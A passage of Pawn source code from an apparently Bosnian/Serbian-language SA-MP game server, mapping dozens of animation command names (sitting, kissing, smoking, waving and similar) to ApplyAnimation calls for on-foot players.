		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "PARACHUTE", "FALL_skyDive_DIE", 4.0, 0, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "shakehead", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "MISC", "plyr_shkhead", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "camera", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CAMERA","camcrch_idleloop",4.1,1,0,0,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cockgun", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "SILENCED", "Silence_reload", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "yes", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CLOTHES","CLO_Buy", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "face1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","facanger",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "face2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","facgum",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "face3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","facsurp",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "face4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","facsurpm",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "face5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","factalk",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "face6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","facurios",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "endchat1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","endchat_01",8.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "endchat2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","endchat_02",8.0,0,0,0,0,01);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "endchat3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","endchat_03",8.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "show", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS","point_loop",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bed1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"INT_HOUSE","BED_In_L",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bed2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"INT_HOUSE","BED_In_R",4.1,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bed3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"INT_HOUSE","BED_Loop_L", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bed4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"INT_HOUSE","BED_Loop_R", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "shout1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS","shout_loop",3.0,1,0,0,0,0,6);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "shout2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS","shout_01",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "shout3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS","shout_02",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "look1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS","lkSMG_loop",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "look2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS","lkaround_loop",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "look3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","flee_lkaround_01",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "look4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BAR","Barserve_bottle",3.0,0,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "flag", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CAR","flag_drop",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "handsup", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		//ApplyAnimation(playerid,"ROB_BANK","SHP_HandsSMG_Scr", 4.0, 0, 1, 1, 1, 0);
		ApplyAnimation(playerid, "ped", "handsup", 4.1, 0, 1, 1, 1, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "drunk1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","WALK_DRUNK",4.1,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "drunk2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PAULNMAC", "pnm_loop_a", 3.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "drunk3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PAULNMAC", "pnm_loop_b", 3.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bomb1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BOMBER","BOM_Plant_Loop",4.0,1,0,0,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bomb2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC", "plunger_01", 2.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "laugh", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lookout1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FOOD", "eat_vomit_sk", 4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lookout2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED", "handscower", 4.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lookout3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "robman1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "robman2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED", "gang_gunstand", 4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "crossarms1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "crossarms2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"OTB", "wtchrace_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BEACH", "parksit_w_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BEACH","parksit_m_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BEACH","lay_bac_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BEACH","sitnwait_loop_w", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SUNBATHE","Lay_Bac_in",3.0,0,1,1,1,0,5);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SUNBATHE","batherdown",3.0,0,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lay8", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SUNBATHE","parksit_m_in",3.0,0,1,1,1,0,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "hide1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ped", "cower", 3.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "hide2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS","panic_hide",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "vomit", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "eat", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "wave1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "wave2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BD_Fire", "BD_GF_Wave", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "wave3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"RIOT","RIOT_CHANT",4.0,1,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "wave4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"WUZI", "Wuzi_Follow", 5.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "wave5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING", "gfwave2", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "slap1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "slap2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","Bitchslap",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "deal1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "deal2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"DEALER","DRUGS_BUY", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "crack1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "crack2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "CRACK", "crckidle1", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "crack3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CRACK","crckidle2", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "crack4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CRACK","crckidle3", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "crack5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"CRACK","crckidle4", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "smoke1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "smoke2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SMOKING", "F_smklean_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "smoke3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "SMOKING","M_smkstnd_loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "smoke4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SMOKING","M_smk_out", 4.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "smoke5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SMOKING","M_smk_in",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "smoke6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SMOKING","M_smk_tap",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "chat1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","IDLE_CHAT",2.0,1,0,0,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "chat2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","IDLE_CHAT_02",2.0,1,0,0,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "chat3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BAR","Barcustom_order",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "hike1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","hiker_pose",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "hike2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","hiker_pose_l",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "hike3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","idle_taxi",3.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "fuck1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","fucku",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "fuck2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"RIOT","RIOT_FUKU",2.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "taichi", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sit1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","SEAT_down",4.1,0,1,1,1,0,8);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sit2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","seat_lr",2.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sit3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","seat_talk_01",2.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sit4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","seat_talk_02",2.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sit5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","SEAT_idle", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sit6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"INT_OFFICE","OFF_Sit_Type_Loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "salute", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GHANDS","gsign5LH",4.0,0,1,1,1,1000,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "fall1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","KO_skid_front",4.1,0,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "fall2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","FLOOR_hit_f", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING", "Playa_Kiss_02", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BD_Fire", "grlfrd_kiss_03", 2.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BD_FIRE","Grlfrd_Kiss_03",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING","Grlfrd_Kiss_01",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING","Grlfrd_Kiss_02",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING","Grlfrd_Kiss_03",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING","Playa_Kiss_01",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "kiss8", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING","Playa_Kiss_02",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
